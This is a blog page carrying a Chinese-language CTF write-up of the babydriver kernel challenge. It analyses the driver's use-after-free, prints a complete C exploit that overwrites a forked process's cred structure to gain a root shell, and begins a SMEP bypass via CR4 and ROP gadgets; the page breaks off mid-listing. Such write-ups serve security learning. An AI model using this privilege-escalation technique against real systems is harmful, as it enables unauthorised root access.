<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/24/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/24/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/kernel%20UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/17/kernel%20UAF/" class="post-title-link" itemprop="url">kernel UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-17 20:42:55" itemprop="dateCreated datePublished" datetime="2022-05-17T20:42:55+08:00">2022-05-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-04 23:13:58" itemprop="dateModified" datetime="2022-06-04T23:13:58+08:00">2022-06-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babydriver 复现</strong></p>
<p>首先使用 boot.sh 启动 kernel：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./boot.sh</span><br><span class="line">Could <span class="keyword">not</span> access KVM kernel <span class="keyword">module</span>: No such file <span class="keyword">or</span> directory</span><br><span class="line">qemu-system-x86_64: failed to initialize KVM: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<p>未能初始化 kvm，大概率是因为系统不支持虚拟化</p>
<p>可以通过如下命令检查是否支持：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep <span class="string">&#x27;^flags.*(vmx|svm)&#x27;</span> /proc/cpuinfo </span><br></pre></td></tr></table></figure>
<p>如果输出 NULL 则代表不支持，具体的解决措施网上都有</p>
<p>然后用如下命令解压 rootfs.cpio：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv ../rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip ./rootfs.cpio.gz </span><br></pre></td></tr></table></figure>
<ul>
<li>PS：这个 rootfs.cpio 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<p>用如下命令进行提取：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio </span><br></pre></td></tr></table></figure>
<p>先看看 init：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver cat init                            </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc # mount:挂载</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag # 设置文件所有者和文件关联组(只有root权限才能拿flag)</span><br><span class="line">chmod 400 flag </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 尖括号可以将数据从一个地方转移到另一个地方</span></span><br><span class="line">exec 0&lt;/dev/console # 将/dev/console设备,重定向为标准输入</span><br><span class="line">exec 1&gt;/dev/console # 将标准输出,重定向为/dev/console设备</span><br><span class="line">exec 2&gt;/dev/console # 将标准错误,重定向为/dev/console设备</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko # 添加了babydriver.ko驱动(可能有洞)</span><br><span class="line">chmod 777 /dev/babydev # babydev全权限</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot; # 打印一句话</span><br><span class="line">setsid cttyhack setuidgid 1000 sh # 设置用户ID(和权限相关)</span><br><span class="line"></span><br><span class="line">umount /proc # umount:取消挂载</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 babydev 是人为添加的一个文件，可以把它认为是一个虚拟外设（有点类似于键盘缓冲区之类的东西）</li>
</ul>
<p>一般 kernel pwn 都会在驱动函数那里设置漏洞，把它拿出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver checksec babydriver.ko </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/CISCN2017_babydriver/babydriver/babydriver.ko&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>用IDA分析 babydriver.ko：</p>
<img src="/2022/05/17/kernel%20UAF/1652785739175-1653066925237.png" class width="1652785739175"> 
<ul>
<li>和上一个 kernel pwn 不同，这个 IDA 分析的还是很清楚的，原因就在于它没有去除符号表</li>
</ul>
<p>init_module：初始化模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &lt; <span class="number">0</span> ) <span class="comment">// 向内核申请设备号</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13alloc_chrdev_region failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cdev_init(&amp;cdev, &amp;fops); <span class="comment">// 初始化cdev结构体变量</span></span><br><span class="line">  qword_D60 = (__int64)&amp;_this_module;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)cdev_add(&amp;cdev, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>) &gt;= <span class="number">0</span> ) <span class="comment">// 向Linux内核系统中添加一个新的cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = _class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no); <span class="comment">// 创建一个设备类(有面向对象的味道)</span></span><br><span class="line">    babydev_class = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( device_create(v0, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>) ) <span class="comment">// 创建对应的设备</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      printk(<span class="string">&quot;13create device failed&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">      class_destroy(babydev_class); <span class="comment">// 删除对应的设备</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(<span class="string">&quot;13create class failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_del(&amp;cdev); <span class="comment">// 用于从Linux内核系统中移除cdev结构体变量所描述的字符设备</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13cdev init failed\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  unregister_chrdev_region((<span class="keyword">unsigned</span> <span class="keyword">int</span>)babydev_no, <span class="number">1LL</span>); <span class="comment">// 释放原先申请的设备号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>值得注意的是：该程序把“驱动函数”和“babydev”进行了绑定（申请了一个名为“babydev”的设备，该驱动文件 babydriver.ko 就是为设备“babydev”为生的）</li>
</ul>
<p>babyioctl：定义驱动函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 size; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, command); <span class="comment">// 这里的fp是&quot;文件指针&quot;(fd是文件描述符)</span></span><br><span class="line">  size = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(size, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = size;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义了 0x10001 的命令：释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len </li>
</ul>
<p>babyopen：打开文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一块 64 字节的空间，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len </li>
</ul>
<p>babyread：读文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyread</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_to_user(buf, babydev_struct.device_buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先检查 babydev_struct.device_buf 中是否有数据</li>
<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
<li>然后调用 copy_to_user 把内核数据 babydev_struct.device_buf 拷贝到用户缓冲区 buf</li>
</ul>
<p>babywrite：写文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babywrite</span><span class="params">(FILE *fp, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(fp, buf);</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; size )</span><br><span class="line">      copy_from_user(babydev_struct.device_buf, buf, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先检查 babydev_struct.device_buf 中是否有数据</li>
<li>再检查用户申请的长度 size 是否大于 babydev_struct.device_buf</li>
<li>然后调用 copy_from_user 把用户缓冲区 buf 拷贝到内核数据 babydev_struct.device_buf</li>
</ul>
<p>babyrelease：关闭文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放空间 </li>
</ul>
<p><strong>入侵思路</strong></p>
<p>存在一个 <strong>伪条件竞争引发的UAF漏洞</strong>，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间（因为 <code>babydev_struct</code> 是全局的），也就是说，两个设备共用了一个 <code>babydev_struct</code></p>
<p>如果这时释放第一个，那么第二个其实是被释放过的，这样就造成了一个UAF，我们可以通过UAF修改 <code>cred</code> 结构体来提权</p>
<p>那么根据 UAF 的思想，入侵步骤如下：</p>
<ul>
<li>打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小</li>
<li>释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li>
<li>同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root</li>
</ul>
<p>注意：fork() 在创建新进程时，会先 kmalloc 一个内存空间用于存放新进程的 cred，这时就会申请到我们可以控制的那片内存，从而修改 cred</p>
<p>分析官方exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc exp.c -static -masm=intel -g -o exp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// 修改babydev_struct.device_buf_len为sizeof(cred)</span></span><br><span class="line">    close(fd1); <span class="comment">// 释放fd1</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork(); <span class="comment">// 新起进程的cred空间,会被申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改fd2(操控babydev_struct),修改新进程的cred的uid,gid等值为&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据驱动函数：对文件描述符FD进行操作，就是直接控制“babydev_struct”，进而间接控制“cred”</li>
</ul>
<p><strong>bypass-smep</strong></p>
<p>本题目还有另一种做法：绕过 smep 来实现 ret2usr（smep：当 CPU 处于 <code>ring0</code> 模式时，执行用户空间的代码会触发页错误）</p>
<ul>
<li>系统根据 CR4 寄存器的值判断是否开启 smep 保护 </li>
<li>smep 开启：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407f0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1111</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>smep 关闭：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = <span class="number">0x1407e0</span> = <span class="number">10100</span> <span class="number">0000</span> <span class="number">0111</span> <span class="number">1110</span> <span class="number">0000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>而 CR4 寄存器是可以通过 mov 指令修改的：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, <span class="number">0x1407e0</span></span><br></pre></td></tr></table></figure>
<p>先用 extract-vmlinux 获取 vmlinux：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<p>然后使用 Ropper 来寻找 gadget：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver time ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">ropper --file ./vmlinux --nocolor &gt; g1  <span class="number">234.87</span>s user <span class="number">32.60</span>s system <span class="number">139</span>% cpu <span class="number">3</span>:<span class="number">11.53</span> total</span><br></pre></td></tr></table></figure>
<p>先写一个脚本来查找“commit_creds”和“prepare_kernel_cred”（没有开 PIE 和 Kaslr）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 